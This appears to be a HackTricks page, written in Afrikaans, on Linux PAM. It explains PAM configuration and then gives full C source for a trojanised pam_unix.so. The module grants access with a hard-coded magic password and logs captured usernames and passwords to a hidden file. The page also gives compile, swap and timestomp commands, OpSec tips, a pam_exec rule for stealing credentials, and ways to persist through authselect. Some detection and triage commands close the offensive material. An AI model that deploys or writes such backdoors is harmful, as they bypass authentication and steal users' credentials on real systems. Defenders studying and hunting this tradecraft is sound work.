# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Basiese Inligting

**PAM (Pluggable Authentication Modules)** dien as ’n sekuriteitsmeganisme wat **die identiteit van gebruikers wat toegang tot rekenaardienste probeer verkry, verifieer**, en hul toegang op grond van verskeie kriteria beheer. Dit is soortgelyk aan ’n digitale hekwagter wat verseker dat slegs gemagtigde gebruikers met spesifieke dienste kan werk, terwyl hul gebruik moontlik beperk word om stelseloorlading te voorkom.

#### Konfigurasielêers

- **Solaris** ondersteun die verouderde sentrale lêer `/etc/pam.conf`, maar huidige riglyne verkies dienslêers onder `/etc/pam.d`.<sup>[[10]](#references)</sup>
- **Linux-stelsels** verkies ’n gidsbenadering, waar diensspesifieke konfigurasies binne `/etc/pam.d` gestoor word. Die konfigurasielêer vir die login-diens is byvoorbeeld `/etc/pam.d/login`.<sup>[[1]](#references)</sup>

’n Voorbeeld van ’n PAM-konfigurasie vir die login-diens kan soos volg lyk:
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **PAM-bestuursgebiede**

Hierdie gebiede, of bestuursgroepe, sluit **auth**, **account**, **password** en **session** in, wat elkeen vir verskillende aspekte van die authentication- en session-bestuursproses verantwoordelik is:<sup>[[1]](#references)</sup>

- **Auth**: Valideer gebruikersidentiteit, dikwels deur ’n password te versoek.
- **Account**: Hanteer account-verifikasie en kontroleer voorwaardes soos groep-lidmaatskap of tyd-van-dag-beperkings.
- **Password**: Bestuur password-opdaterings, insluitend kompleksiteitskontroles of voorkoming van dictionary attacks.
- **Session**: Bestuur aksies tydens die begin of einde van ’n diens-session, soos die mount van directories of die instelling van resource limits.

#### **PAM-modulekontroles**

Kontroles bepaal die module se reaksie op sukses of mislukking en beïnvloed die algehele authentication-proses. Dit sluit in:<sup>[[1]](#references)</sup>

- **Required**: Mislukking van ’n vereiste module lei uiteindelik tot mislukking, maar eers nadat alle daaropvolgende modules nagegaan is.
- **Requisite**: Onmiddellike beëindiging van die proses wanneer dit misluk.
- **Sufficient**: Indien geen vroeëre `required`-module misluk het nie, keer sukses onmiddellik terug en word die oorblywende modules in dieselfde bestuursgroep oorgeslaan.
- **Optional**: Veroorsaak slegs mislukking indien dit die enigste module in die stack is.

#### Belangrike Offensive Semantics

Wanneer PAM ontleed of gewysig word, bepaal die **ligging van ’n ingevoegde reël** watter stack dit sien:<sup>[[1]](#references)[[13]](#references)</sup>

- `include` en `substack` trek reëls uit ander lêers, dus kan die wysiging van `sshd` slegs SSH beïnvloed, terwyl die wysiging van `system-auth`, `common-auth` of ’n ander gedeelde stack verskeie dienste tegelyk kan beïnvloed.<sup>[[1]](#references)[[13]](#references)</sup>
- PAM ondersteun ook bracketed controls soos `[success=1 default=ignore]`. Dit kan misbruik word om **een of meer modules oor te slaan** ná ’n suksesvolle custom check, in plaas daarvan om `pam_unix.so` sigbaar te vervang.<sup>[[1]](#references)</sup>
- Die `module-path` kan **absoluut** (`/usr/lib/security/pam_custom.so`) of **relatief** tot die verstek-PAM-module-directory wees. Op moderne Linux-stelsels is die werklike directories dikwels `/lib/security`, `/lib64/security`, `/usr/lib/security` of multiarch-paaie soos `/usr/lib/x86_64-linux-gnu/security`.<sup>[[1]](#references)[[14]](#references)</sup>

Vinnige operator-insig: karteer altyd die **volledige diens-grafiek** voordat jy patch. Byvoorbeeld, `sshd -> password-auth -> system-auth` op sommige distros, of `sshd -> system-remote-login -> system-login -> system-auth` op ander, beteken dat dieselfde eenreël-implant ’n veel wyer uitwerking kan hê as wat bedoel is.<sup>[[1]](#references)[[13]](#references)</sup>

#### Voorbeeldscenario

In ’n opstelling met verskeie auth-modules volg die proses ’n streng volgorde. Indien die `pam_securetty`-module bepaal dat die login-terminal ongemagtig is, word root-logins geblokkeer, maar alle modules word steeds verwerk weens die module se "required"-status. Die `pam_env` stel environment variables in, wat moontlik user experience kan verbeter. Die `pam_ldap`- en `pam_unix`-modules werk saam om die gebruiker te authenticate, met `pam_unix` wat probeer om ’n voorheen verskafde password te gebruik, wat doeltreffendheid en buigsaamheid in authentication-metodes verbeter.<sup>[[1]](#references)[[13]](#references)[[15]](#references)[[16]](#references)[[17]](#references)</sup>


## PAM backdoor – Hooking `pam_unix.so`

’n Klassieke persistence-truuk in waardevolle Linux-omgewings is om die **legitieme PAM-library met ’n trojanised drop-in te vervang**. Op ’n host waarvan die PAM-stack `pam_unix.so` laai, kan SSH- of console-authentication sy `pam_sm_authenticate()`-entry point aanroep; ’n kwaadwillige vervanging kan credentials vaslê of ’n *magic*-password bypass implementeer.<sup>[[2]](#references)[[11]](#references)</sup>

### Compilation-cheatsheet
Die skets hieronder gebruik Linux-PAM se `pam_sm_authenticate()`-diens-entry point en `pam_get_authtok()` om toegang tot die authentication-token te verkry.<sup>[[11]](#references)[[12]](#references)</sup>
<details>
<summary>Voorbeeld van ’n `pam_unix.so`-trojan</summary>
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

static void *real_module;
static int (*orig_auth)(pam_handle_t *, int, int, const char **);
static int (*orig_setcred)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

static int load_original(void) {
if (real_module) return 0;
real_module = dlopen("/lib/security/pam_unix.so.bak", RTLD_NOW | RTLD_LOCAL);
if (!real_module) return -1;
orig_auth = dlsym(real_module, "pam_sm_authenticate");
orig_setcred = dlsym(real_module, "pam_sm_setcred");
return (orig_auth && orig_setcred) ? 0 : -1;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user = NULL, *pass = NULL;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
if (user && pass) {
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
if (fd >= 0) {
dprintf(fd, "%s:%s\n", user, pass);
close(fd);
}
}

/* Forward to the renamed original module. */
if (load_original() != 0) return PAM_SYSTEM_ERR;
return orig_auth(pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
if (load_original() != 0) return PAM_SYSTEM_ERR;
return orig_setcred(pamh, flags, argc, argv);
}
```
Kompileer en vervang dit heimlik (die vervangings-/timestomp-patroon word deur Unit 42 gedokumenteer). Pas beide die rugsteunpad wat hardgekodeer is in die wrapper en die opdragte hieronder aan by die teiken se werklike PAM-modulegids:<sup>[[2]](#references)</sup>
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### OpSec-wenke
1. **Atomic overwrite** – skryf ’n volledige library na ’n tydelike lêer en hernoem dit om dit in plek te plaas, sodat ’n gedeeltelik geskryfde authentication module nie agtergelaat word nie.
2. ’n Pad soos `/usr/bin/.dbus.log` is in Unit 42 se AuthDoor-analise waargeneem, en is dus ook ’n nuttige hunting-indikator.<sup>[[2]](#references)</sup>
3. Behou die entry points wat deur die PAM-stack verwag word (byvoorbeeld, `pam_sm_authenticate` en `pam_sm_setcred`), sodat ander bestuursbewerkings steeds werk.<sup>[[11]](#references)[[18]](#references)</sup>

### Opsporing
Vir package-integrity checks verifieer RPM geïnstalleerde-lêer-metadata, rapporteer `debsums -s` checksum-foute, en bevraagteken `dpkg -S` in die triage-blok package ownership; die audit watch-sintaksis teken writes en attribute changes na ’n pad aan.<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)</sup>
* Vergelyk die MD5/SHA256 van `pam_unix.so` met die distro-package.
* Gebruik `rpm -V pam` of `debsums -s libpam-modules` om replaced libraries raak te sien sonder manual hashing.
* Kontroleer vir world-writable of ongewone ownership onder `/lib/security/`.
* `auditd`-reël: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Grep PAM-configs vir onverwagte modules: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

### Vinnige triage-opdragte (post-compromise of threat hunting)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```
### Misbruik van `pam_exec` vir persistence
In plaas daarvan om `pam_unix.so` te vervang, is ’n minder ingrypende benadering om ’n `pam_exec`-reël by `/etc/pam.d/sshd` te voeg, sodat ’n invocation wat daardie PAM-reël bereik, ’n helper uitvoer terwyl die normale stack ongeskonde bly.<sup>[[4]](#references)</sup>
```bash
# Run during the auth phase; expose_authtok sends the token on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec` ontvang PAM-metadata in omgewingsveranderlikes soos `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY` en `PAM_TYPE`. Met `expose_authtok` kan die helper tot `PAM_MAX_RESP_SIZE` grepe van die wagwoord vanaf `stdin` lees tydens `auth`- of `password`-fases. As jy wil hê die helper moet met die effektiewe UID eerder as die werklike UID loop, voeg `seteuid` by.<sup>[[4]](#references)</sup>

Praktiese notas volg die module-tipes en `type=`-filter wat vir `pam_exec` gedokumenteer is:<sup>[[4]](#references)</sup>

- `session optional pam_exec.so ...` is beter vir **post-login actions**, soos om sockets te heropen of ’n losstaande daemon te spawn.
- `auth optional pam_exec.so quiet expose_authtok ...` is die gewone keuse vir **credential capture**, omdat dit loop voordat die sessie oopmaak.
- `type=session` of `type=auth` kan gebruik word om uitvoering tot ’n spesifieke PAM-fase te beperk en raserige dubbele uitvoering te vermy.

### Oorlewing van distro tooling: `authselect`

Op RHEL- en Fedora-familiestelsels wat `authselect` gebruik, kan direkte wysigings aan gegenereerde lêers soos `/etc/pam.d/system-auth` of `/etc/pam.d/password-auth` deur **`authselect` oorgeskryf word**. Vir persistence patch operateurs dikwels die aktiewe custom profile onder `/etc/authselect/custom/<profile>/` en kies dit daarna weer.<sup>[[5]](#references)[[19]](#references)</sup>

Tipiese workflow wanneer jy root het:<sup>[[5]](#references)</sup>
```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Regenerate the PAM files after modifying the active custom profile
authselect apply-changes
```
Dit is belangrik vir beide offense en triage: as `/etc/pam.d/system-auth` die banner `Generated by authselect` en `Do not modify this file manually` bevat, kan die werklike persistence point onder `/etc/authselect/custom/` eerder as in `/etc/pam.d/` wees.<sup>[[5]](#references)</sup>

### Onlangse tradecraft wat in die wild waargeneem is

Onlangse verslaggewing uit 2025 oor die **Plague** Linux-backdoor het dieselfde kernidee verder gevoer: ’n kwaadwillige PAM-komponent met ’n **static bypass password**, plus opruiming van SSH-verwante omgewingsveranderlikes en shell history (`HISTFILE=/dev/null`) om sessiespore ná login te verminder.<sup>[[3]](#references)</sup> Dit is ’n nuttige hunting pattern omdat die backdoor-logika in PAM kan wees, terwyl die stealth artifacts slegs **ná** suksesvolle authentication verskyn.


## References

- [1] [pam.conf(5) / pam.d(5) - Linux-PAM-handleiding](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [2] [Die Covert Operator se Playbook: Infiltrasie van globale telekommunikasienetwerke - Unit 42](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
- [3] [Nextron Systems - Plague: ’n Nuut Ontdekte PAM-Gebaseerde Backdoor vir Linux](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)
- [4] [pam_exec(8) - Linux-PAM-handleiding](https://man7.org/linux/man-pages/man8/pam_exec.8.html)
- [5] [Konfigureer gebruikersauthentication met authselect - Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/10/html/configuring_authentication_and_authorization_in_rhel/configuring-user-authentication-using-authselect)
- [6] [rpm(8) - RPM](https://rpm.org/docs/4.20.x/man/rpm.8)
- [7] [debsums(1) - Debian Manpages](https://manpages.debian.org/unstable/debsums/debsums.1.en.html)
- [8] [auditctl(8) - Linux-manbladsy](https://man7.org/linux/man-pages/man8/auditctl.8.html)
- [9] [dpkg-query(1) - Debian Manpages](https://manpages.debian.org/testing/dpkg/dpkg-query.1.en.html)
- [10] [Bestuur authentication in Oracle Solaris 11.4](https://docs.oracle.com/cd/E37838_01/pdf/E67470.pdf)
- [11] [pam_sm_authenticate(3) - Linux-PAM-handleiding](https://man7.org/linux/man-pages/man3/pam_sm_authenticate.3.html)
- [12] [pam_get_authtok(3) - Linux-PAM-handleiding](https://man7.org/linux/man-pages/man3/pam_get_authtok.3.html)
- [13] [Stelselvlak-authenticationgids - Red Hat Enterprise Linux 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html-single/system-level_authentication_guide/index)
- [14] [Ubuntu-pakketlêerlys: libpam-modules/noble/amd64](https://packages.ubuntu.com/noble/amd64/libpam-modules/filelist)
- [15] [pam_env(8) - Linux-PAM-handleiding](https://man7.org/linux/man-pages/man8/pam_env.8.html)
- [16] [pam_unix(8) - Linux-PAM-handleiding](https://man7.org/linux/man-pages/man8/pam_unix.8.html)
- [17] [pam_ldap(5) - Debian Manpages](https://manpages.debian.org/testing/libpam-ldap/pam_ldap.5.en.html)
- [18] [pam_sm_setcred(3) - Linux-PAM-handleiding](https://man7.org/linux/man-pages/man3/pam_sm_setcred.3.html)
- [19] [Verandering: Maak Authselect verpligtend - Fedora Project Wiki](https://fedoraproject.org/wiki/Changes/Make_Authselect_Mandatory)
{{#include ../../banners/hacktricks-training.md}}
